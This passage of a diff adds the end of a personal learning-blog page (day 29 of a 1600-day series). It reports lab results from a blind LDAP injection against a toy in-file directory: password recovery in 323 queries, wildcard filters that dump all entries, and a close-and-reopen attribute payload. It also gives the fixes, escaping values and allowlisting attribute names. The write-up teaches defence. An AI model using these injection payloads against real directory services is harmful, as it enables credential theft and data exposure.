+   recovered              = &#x27;Verano2026&#x27;  (correct)
+   queries                = 323
+   one query per character position = 10, brute force = 839,299,365,868,340,224 without the oracle
+   the same corpus with escaping: every query returns 0, so the oracle is dead
+   -&gt; 5 escaped queries, 0 matches, prefix never confirmed
+
+== 5. what it costs to read the whole directory
+   filter (&amp;(uid=*)(userPassword=*)) -&gt; 5 of 5 entries
+   filter (uid=*)                     -&gt; 5 of 5 entries
+   filter (uid=tomas)                 -&gt; 1 of 5 entries
+
+== 6. the attribute name is a parameter too, and an allowlist stops it there
+   attr=&#x27;uid)(userPassword=*&#x27; -&gt; ParseError: unknown attribute &#x27;uid)(userPassword&#x27;
+   attr allowlist [&#x27;uid&#x27;, &#x27;cn&#x27;, &#x27;userPassword&#x27;, &#x27;role&#x27;]: the name slot is closed,
+   the value slot is still open unless it is escaped.</code></pre>
+<p><strong>What I understood:</strong> the module that escapes is worth more than the review comment that</p>
+<p>says &quot;escape it&quot;. Every number here came from a directory of five entries that lives inside</p>
+<p>the file — no network, no target, nothing that does not exist in this repository. The</p>
+<p>lesson survives the toy: a filter is a program, a value is data, and the only way to keep</p>
+<p>the second from becoming the first is an escape table applied on the side of the boundary</p>
+<p>that owns the grammar.</p>
+<p>---</p>
+<h2>Day 29 notes</h2>
+<ul><li>Concept #29: two bounds, one scheduler, 120 priority orders per instance. Instance A:</li></ul>
+<p>  bound 6, optimum 6, greedy 7 (+16.67%), 24 orders reach the optimum. Instance B: bounds</p>
+<p>  promise 7, optimum is 8, greedy 10 (+25%), longest-chain-first 8. Both gaps inside the</p>
+<p>  2 − 1/m guarantee. ✔</p>
+<ul><li>Security #29: <code>*</code> in the password field is a wildcard, not a password; <code>\2a</code> kills it;</li></ul>
+<p>  the classic close-and-reopen payload is a ParseError on a strict parser and a full</p>
+<p>  directory dump on a lenient one; 323 requests recovered a 10-character password that</p>
+<p>  brute force would need 8.39e17 for. Attribute names get an allowlist, values get an</p>
+<p>  escape table. ✔</p>
+<ul><li>1571 days left. One at a time.</li></ul>
+<p><em>Written by my own daily machine, checked by me.</em></p>
+  </div>
+</article>
+<footer>
+  <div class="wrap">
+    <p><a href="/">← Back to the index</a> · Day 029 of 1600 · Matías Rathgeb</p>
+  </div>
+</footer>
+</body>
+</html>
